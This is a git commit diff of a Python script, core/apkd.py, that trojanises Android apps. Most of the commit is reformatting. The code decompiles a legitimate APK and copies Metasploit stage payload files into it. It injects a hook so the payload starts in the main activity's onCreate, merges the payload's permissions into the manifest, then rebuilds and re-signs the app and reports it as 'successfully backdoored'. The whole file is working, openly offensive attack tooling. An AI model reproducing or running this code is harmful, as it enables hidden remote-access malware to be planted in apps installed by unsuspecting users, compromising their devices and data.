886abd85d9062ab1eb23ce0cdd0d5e4832e64e54
t0rjan <99999r00t@gmail.com>
2018-04-20 18:29:26 +0800

    init project

--- core/apkd.py
+++ core/apkd.py
@@ -1,4 +1,3 @@
-
 #    Copyright (C) <2016>  <M U Suraj>
 #
 #    This program is free software; you can redistribute it and/or modify
@@ -24,84 +23,90 @@ import sys
 
 pyc = pycolor.pyColor()
 
+
 def decompile(mainapk):
-	print pyc.Info("Decompiling apks...")
-	os.system("./apktool.sh d -f %s"%mainapk)
-	os.system("./apktool.sh d -f temp.apk")
+    print pyc.Info("Decompiling apks...")
+    os.system("./apktool.sh d -f %s" % mainapk)
+    os.system("./apktool.sh d -f temp.apk")
+
 
 def inject(mainapk):
-	print pyc.Info("Injecting payload...")
-	mainapkname = os.path.splitext(mainapk)[0]
-	mk = "mkdir %s/smali/com/metasploit"%mainapkname
-	os.system(mk)
-	mk = "mkdir %s/smali/com/metasploit/stage"%mainapkname
-	os.system(mk)
-	cp = "cp temp/smali/com/metasploit/stage/Payload*  %s/smali/com/metasploit/stage/"%mainapkname
-	os.system(cp)
-	filemanifest = "%s/AndroidManifest.xml"%mainapkname
-	fhandle = open(filemanifest,'r')
-	fread = fhandle.read()
-	fhandle.close()
-	fread = fread.split('<action android:name="android.intent.action.MAIN"/>')[0].split('<activity android:')[1]
-	acn = re.search('android:name=\"[\w.]+',fread)
-	activityname = acn.group(0).split('"')[1]
-	acpath = activityname.replace('.','/') + ".smali"
-	smalipath = "%s/smali/%s"%(mainapkname, acpath)
-	fhandle = open(smalipath,'r')
-	fread = fhandle.read()
-	fhandle.close()
-	print pyc.Info("Injecting hooks in %s..."%activityname)
-	fhalf = fread.split(";->onCreate(Landroid/os/Bundle;)V")[0]
-	shalf = fread.split(";->onCreate(Landroid/os/Bundle;)V")[1]
-	injection = ";->onCreate(Landroid/os/Bundle;)V\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
-	total = fhalf + injection + shalf
-	fhandle = open(smalipath,'w')
-	fhandle.write(total)
-	fhandle.close()
-	print pyc.Succ("Hook injected -> metasploit/stage/Payload")
+    print pyc.Info("Injecting payload...")
+    mainapkname = os.path.splitext(mainapk)[0]
+    mk = "mkdir %s/smali/com/metasploit" % mainapkname
+    os.system(mk)
+    mk = "mkdir %s/smali/com/metasploit/stage" % mainapkname
+    os.system(mk)
+    cp = "cp temp/smali/com/metasploit/stage/Payload*  %s/smali/com/metasploit/stage/" % mainapkname
+    os.system(cp)
+    filemanifest = "%s/AndroidManifest.xml" % mainapkname
+    fhandle = open(filemanifest, 'r')
+    fread = fhandle.read()
+    fhandle.close()
+    fread = fread.split('<action android:name="android.intent.action.MAIN"/>')[0].split('<activity android:')[1]
+    acn = re.search('android:name=\"[\w.]+', fread)
+    activityname = acn.group(0).split('"')[1]
+    acpath = activityname.replace('.', '/') + ".smali"
+    smalipath = "%s/smali/%s" % (mainapkname, acpath)
+    fhandle = open(smalipath, 'r')
+    fread = fhandle.read()
+    fhandle.close()
+    print pyc.Info("Injecting hooks in %s..." % activityname)
+    fhalf = fread.split(";->onCreate(Landroid/os/Bundle;)V")[0]
+    shalf = fread.split(";->onCreate(Landroid/os/Bundle;)V")[1]
+    injection = ";->onCreate(Landroid/os/Bundle;)V\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
+    total = fhalf + injection + shalf
+    fhandle = open(smalipath, 'w')
+    fhandle.write(total)
+    fhandle.close()
+    print pyc.Succ("Hook injected -> metasploit/stage/Payload")
+
 
 def permissions(mainapk):
-	print pyc.Info("Adding permissions...")
-	mainapkname = os.path.splitext(mainapk)[0]
-	filemanifest = "temp/AndroidManifest.xml"
-	fhandle = open(filemanifest,'r')
-	fread = fhandle.readlines()
-	prmns = []
-	for line in fread:
-		if('<uses-permission' in line):
-			prmns.append(line.replace('\n',''))	
-	fhandle.close()
-	filemanifest = "%s/AndroidManifest.xml"%mainapkname
-	fhandle = open(filemanifest,'r')
-	fread = fhandle.readlines()
-	half=[]
-	for line in fread:
-		if('<uses-permission' in line):
-			prmns.append(line.replace('\n',''))
-		else:
-			half.append(line)
-	prmns = set(prmns)
-	fhandle.close()
-	
-	fhandle = open(filemanifest,'w')
-	for i in half:
-		if half.index(i)==2:
-			for j in prmns:
-				fhandle.write(j+"\n")
-		else:
-			fhandle.write(i)
-	for i in prmns:
-		print '\t',i.split('android:name="')[1].split('"')[0]
-	print pyc.Succ("%d Permissions added."%(len(prmns)))
-	
-def rebuild(mainapk):
-	print pyc.Info("Recompiling...")
-	mainapkname = os.path.splitext(mainapk)[0]
-	rebuild = "./apktool.sh b -f %s"%mainapkname	
-	os.system(rebuild)
-	print pyc.Info("Signing apk...")
-	path = "%s/dist/%s"%(mainapkname,mainapk)
-	signapk = "java -jar uber-apk-signer/uber-apk-signer-0.8.4.jar  %s -o %s-final.apk"%(path,mainapk[:-4])
-	os.system(signapk)
-	print pyc.Succ("Successfully backdoored and saved as %s-final.apk"%mainapk[:-4])
+    print pyc.Info("Adding permissions...")
+    mainapkname = os.path.splitext(mainapk)[0]
+    filemanifest = "temp/AndroidManifest.xml"
+    fhandle = open(filemanifest, 'r')
+    fread = fhandle.readlines()
+    prmns = []
+    for line in fread:
+        if ('<uses-permission' in line):
+            prmns.append(line.replace('\n', ''))
+    fhandle.close()
+    filemanifest = "%s/AndroidManifest.xml" % mainapkname
+    fhandle = open(filemanifest, 'r')
+    fread = fhandle.readlines()
+    half = []
+    for line in fread:
+        if ('<uses-permission' in line):
+            prmns.append(line.replace('\n', ''))
+        else:
+            half.append(line)
+    prmns = set(prmns)
+    fhandle.close()
 
+    fhandle = open(filemanifest, 'w')
+    for i in half:
+        if half.index(i) == 2:
+            for j in prmns:
+                fhandle.write(j + "\n")
+        else:
+            fhandle.write(i)
+    for i in prmns:
+        print '\t', i.split('android:name="')[1].split('"')[0]
+    print pyc.Succ("%d Permissions added." % (len(prmns)))
+
+
+def rebuild(mainapk):
+    print pyc.Info("Recompiling...")
+    mainapkname = os.path.splitext(mainapk)[0]
+    rebuild = "./apktool.sh b -f %s" % mainapkname
+    os.system(rebuild)
+    print pyc.Info("Signing apk...")
+    path = "%s/dist/%s" % (mainapkname, mainapk)
+
+    print pyc.Info("path: %s" % path)
+
+    signapk = "java -jar uber-apk-signer/uber-apk-signer-0.8.4.jar  %s -o %s-final.apk" % (path, mainapk[:-4])
+    os.system(signapk)
+    print pyc.Succ("Successfully backdoored and saved as %s-final.apk" % mainapk[:-4])
